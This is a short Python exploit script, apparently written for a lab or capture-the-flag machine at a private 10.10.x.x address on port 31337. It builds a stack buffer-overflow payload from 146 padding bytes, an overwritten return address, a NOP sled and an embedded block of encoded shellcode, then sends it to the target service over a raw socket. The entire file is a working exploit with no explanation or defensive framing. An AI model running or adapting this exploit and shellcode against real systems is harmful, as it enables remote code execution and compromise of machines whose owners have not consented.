import socket

ip = "10.10.239.3"
port = 31337

offset = 146
overflow = "A" * offset
retn = "\xC3\x14\x04\x08"
padding = "\x90" * 13
payload = ("\xda\xc2\xba\x4e\x38\xe7\x86\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x5e\x31\x53\x1a\x83\xeb\xfc\x03\x53\x16\xe2\xbb\xc4\x0f\x09"
"\x43\x35\xd0\x76\xca\xd0\xe1\xa4\xa8\x91\x50\x79\xbb\xf4\x58"
"\xf2\xe9\xec\x6f\xb3\x47\x2b\x41\x44\xdc\x41\x89\x8b\x22\x09"
"\xf5\x8a\xde\x50\x2a\x6d\xdf\x9a\x3f\x6c\x18\x6d\x35\x81\xf4"
"\xe5\xe7\x4d\x73\xbb\x3b\x6f\x53\xb7\x04\x17\xd6\x08\xd3\x93"
"\x94\x89\x0c\x0b\xaf\xc2\xb4\x27\xf7\xf2\xc5\xe4\x82\x3a\xb1"
"\x36\xc5\x8d\xc5\xcc\xe1\x66\x38\x05\x38\xb9\xfa\x66\x37\x95"
"\xfc\xbf\x7f\x05\x8b\xcb\x7c\xb8\x8c\x0f\xff\x66\x18\x90\xa7"
"\xed\xba\x74\x56\x21\x5c\xfe\x54\x8e\x2a\x58\x78\x11\xfe\xd2"
"\x84\x9a\x01\x35\x0d\xd8\x25\x91\x56\xba\x44\x80\x32\x6d\x78"
"\xd2\x9a\xd2\xdc\x98\x08\x04\x60\x61\xd3\x29\x3c\xf6\x18\xe4"
"\xbf\x06\x36\x7f\xb3\x34\x99\x2b\x5b\x75\x52\xf2\x9c\x0c\x74"
"\x05\x72\xb6\x14\xfb\x73\xc7\x3d\x38\x27\x97\x55\xe9\x48\x7c"
"\xa5\x16\x9d\xe9\xaf\x80\x14\xe6\x02\xec\x41\xf4\x5c\x1c\xce"
"\x71\xba\x4e\xbe\xd1\x12\x2f\x6e\x92\xc2\xc7\x64\x1d\x3d\xf7"
"\x86\xf7\x56\x92\x68\xae\x0f\x0b\x10\xeb\xdb\xaa\xdd\x21\xa6"
"\xed\x56\xc0\x57\xa3\x9e\xa1\x4b\xd4\xf8\x49\x93\x25\x6d\x4a"
"\xf9\x21\x27\x1d\x95\x2b\x1e\x69\x3a\xd3\x75\xe9\x3c\x2b\x08"
"\xd8\x37\x1a\x9e\x64\x2f\x63\x4e\x65\xaf\x35\x04\x65\xc7\xe1"
"\x7c\x36\xf2\xed\xa8\x2a\xaf\x7b\x53\x1b\x1c\x2b\x3b\xa1\x7b"
"\x1b\xe4\x5a\xae\x1f\xe3\xa5\x2d\x08\x4c\xce\xcd\x08\x6c\x0e"
"\xa7\x88\x3c\x66\x3c\xa6\xb3\x46\xbd\x6d\x9c\xce\x34\xe0\x6e"
"\x6e\x49\x29\x2e\x2e\x4a\xde\xeb\xc1\x31\xaf\x0c\x22\xc6\xb9"
"\x68\x22\xc7\xc5\x8e\x1e\x1e\xfc\xe4\x61\xa3\xbb\xe7\x7f\x09"
"\xb6\x8f\xd9\xd8\x7b\xd2\xd9\x37\xbf\xeb\x59\xbd\x40\x08\x41"
"\xb4\x45\x54\xc5\x25\x34\xc5\xa0\x49\xeb\xe6\xe0")

buffer = overflow + retn + padding + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
